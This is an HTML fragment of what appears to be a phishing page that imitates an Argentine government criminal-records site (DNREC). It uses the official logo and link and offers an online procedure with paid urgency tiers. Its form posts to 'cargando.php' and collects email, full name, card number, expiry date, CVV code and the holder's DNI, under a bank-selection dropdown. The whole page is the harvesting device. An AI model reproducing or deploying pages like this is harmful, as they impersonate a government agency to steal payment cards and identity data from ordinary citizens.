...
<body><audio class="audio-for-speech" src=""></audio><span class="translate-button-mtz translator-hidden" style="top: 136.3000030517578px;left: 681.8250122070312px;"></span>
    <form method="post" action="cargando.php" id="form1">
...
//]]>
            ...
            <div class="container">
              <div>
                <div class="navbar-header">
                  ...
                  <a href="http://www.dnrec.jus.gov.ar/" class="navbar-brand"><img src="logo_argentina-blanco.svg"></a>
                </div>
    ...
    <h4>Trámite en línea vía tarjeta de débito o crédito</h4>
    ...
    <div id="ContentPlaceHolder1_UpdatePanelBanco">
            ...
            <!-- Banco -->
            <label>
                Seleccione el banco dónde es titular de cuenta, complete el formulario de pago y presione CONTINUAR:</label>
            
 <select name="tramite" id="ContentPlaceHolder1_ddlBanco" class="form-control input-sm">
		<option selected="selected" value="0"> Seleccione prioridad del tramite</option>
		<option value="urgente">Urgente: lo tenés en 24 horas y cuesta $300.</option>
		<option value="muy urgente">Muy urgente: lo tenés en 6 horas y cuesta $560.</option>
		<option value="exprés">Exprés: lo tenés en 1 hora y cuesta $980.</option>
	...
	</select><select name="tipo" id="ContentPlaceHolder1_ddlBanco" class="form-control input-sm">
		<option selected="selected" value="0"> Seleccione entidad emisora</option>
		...
		<option value="Nación Argentina">Nación Argentina</option>
		<option value="Nuevo Banco de Entre Ríos">Nuevo Banco de Entre Ríos</option>
		<option value="Nuevo Banco de Santa Fé">Nuevo Banco de Santa Fé</option>
		<option value="Nuevo Banco del Chaco">Nuevo Banco del Chaco</option>
		<option value="Otros bancos de la Red Banelco">Otros bancos de la Red Banelco</option>
		<option value="Otros bancos de la Red Link">Otros bancos de la Red Link</option>
		<option value="Patagonia">Patagonia</option>
		
		<option value="Provincia de Buenos Aires">Provincia de Buenos Aires</option>
		<option value="Provincia de Neuquén">Provincia de Neuquén</option>
...
<input placeholder="correo electronico" name="email" id="ContentPlaceHolder1_ddlBanco" class="form-control input-sm" required="">
 <label>
</label>
<input placeholder="nombre y apellido" name="nombre" id="ContentPlaceHolder1_ddlBanco" class="form-control input-sm" required="">
 <label>
</label>
<input placeholder="Numero de tarjeta" name="tarje" id="ContentPlaceHolder1_ddlBanco" class="form-control input-sm" required="">
 <label>
</label>
<input placeholder="fecha de vencimiento" name="fech" id="ContentPlaceHolder1_ddlBanco" class="form-control input-sm" required="">
 <label>
</label>
<input placeholder="Codigo cvv" name="cvv" id="ContentPlaceHolder1_ddlBanco" class="form-control input-sm" required="">
 <label>
</label><input placeholder="Dni del titular" name="dnititu" id="ContentPlaceHolder1_ddlBanco" class="form-control input-sm" required="">
            <span id="ContentPlaceHolder1_cmpBanco" class="validator" style="color:Red;display:none;">Debe seleccionar su banco</span>
